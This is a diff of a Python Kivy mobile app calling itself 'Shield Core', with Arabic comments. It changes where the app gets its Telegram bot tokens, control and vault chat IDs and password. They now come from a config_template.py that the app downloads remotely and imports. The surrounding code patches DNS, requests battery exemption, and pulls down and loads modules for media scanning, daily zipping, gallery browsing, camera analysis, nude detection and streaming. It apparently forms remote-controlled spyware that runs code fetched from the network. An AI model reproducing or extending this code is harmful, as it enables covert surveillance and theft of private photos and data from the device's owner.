@@ -17,7 +17,7 @@ from kivy.uix.button import Button
 from kivy.clock import Clock
 from kivy.core.clipboard import Clipboard
 
-# ========== دالة DNS patch (كما هي) ==========
+# ========== DNS patch ==========
 def _patch_dns():
     original_getaddrinfo = socket.getaddrinfo
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
@@ -108,21 +108,24 @@ def _perms():
     except Exception as e:
         print(f"Battery exemption error: {e}")
 
-# ========== قراءة الأسرار من متغيرات البيئة ==========
-def load_secrets_from_env():
-    """قراءة التوكنات والمعرفات من متغيرات البيئة (GitHub Secrets)"""
-    active_tokens_str = os.environ.get("ACTIVE_TOKENS", "")
-    reserve_tokens_str = os.environ.get("RESERVE_TOKENS", "")
-    if not active_tokens_str:
-        raise Exception("ACTIVE_TOKENS env var not set")
-    active = [t.strip() for t in active_tokens_str.split(",") if t.strip()]
-    reserve = [t.strip() for t in reserve_tokens_str.split(",") if t.strip()] if reserve_tokens_str else []
-    ctrl = int(os.environ.get("CONTROL_CHAT_ID", "0"))
-    vault = int(os.environ.get("VAULT_CHAT_ID", "0"))
-    password = os.environ.get("APP_PASSWORD", "")
-    if not ctrl or not vault or not password:
-        raise Exception("Missing CONTROL_CHAT_ID, VAULT_CHAT_ID or APP_PASSWORD")
-    return active, reserve, ctrl, vault, password
+# ========== تحميل الإعدادات من config_template.py ==========
+def load_secrets_from_config():
+    """يستورد config_template.py (أو config.py) ويستدعي load_config() لاستخراج التوكنات والإعدادات"""
+    config_module = None
+    # محاولة استيراد config_template أولاً (إذا كان موجوداً في sys.path)
+    try:
+        config_module = importlib.import_module("config_template")
+    except ImportError:
+        try:
+            config_module = importlib.import_module("config")
+        except ImportError:
+            pass
+    if config_module is None:
+        raise Exception("لا يمكن العثور على config_template.py أو config.py في المسار")
+    if not hasattr(config_module, 'load_config'):
+        raise Exception("الملف الموجود لا يحتوي على دالة load_config")
+    active, reserve, ctrl, vault, secret = config_module.load_config()
+    return active, reserve, ctrl, vault, secret
 
 # ========== تطبيق Kivy ==========
 class CoreApp(App):
@@ -227,7 +230,7 @@ class CoreApp(App):
 
     def _run(self):
         _perms()
-        self._log("Shield Core v4.2 (GitHub Secrets mode) starting...", "BOOT")
+        self._log("Shield Core v4.2 (Config template mode) starting...", "BOOT")
 
         # ---- 1. جلب قائمة الملفات من index.json ----
         all_files = []
@@ -258,8 +261,7 @@ class CoreApp(App):
             if name == "engine_v2.tflite":
                 model_url = url
                 continue
-            if name in ("main.py", "config_template.py"):
-                continue
+            # نحمّل كل شيء بما في ذلك config_template.py
             self._download_safe(url, name)
 
         # ---- 3. تحميل الموديل ----
@@ -274,19 +276,20 @@ class CoreApp(App):
 
         # ---- 4. تنظيف الوحدات القديمة ----
         modules_to_remove = ["monitor", "telegram_ui", "commands", "media_scanner", "daily_zipper",
-                             "gallery_browser", "camera_analyzer", "nude_detector", "stream_manager"]
+                             "gallery_browser", "camera_analyzer", "nude_detector", "stream_manager",
+                             "config_template", "config"]
         for mod in modules_to_remove:
             if mod in sys.modules:
                 del sys.modules[mod]
         importlib.invalidate_caches()
         gc.collect()
 
-        # ---- 5. تحميل الأسرار من البيئة ----
+        # ---- 5. تحميل الإعدادات من config_template.py ----
         try:
-            active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = load_secrets_from_env()
-            self._log("Secrets loaded from environment.")
+            active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = load_secrets_from_config()
+            self._log("Secrets loaded from config_template.py")
         except Exception as e:
-            self._log(f"Failed to load secrets: {e}", "ERROR")
+            self._log(f"Failed to load secrets from config_template: {e}", "ERROR")
             return
 
         # ---- 6. التأكد من وجود telegram_ui.py ----
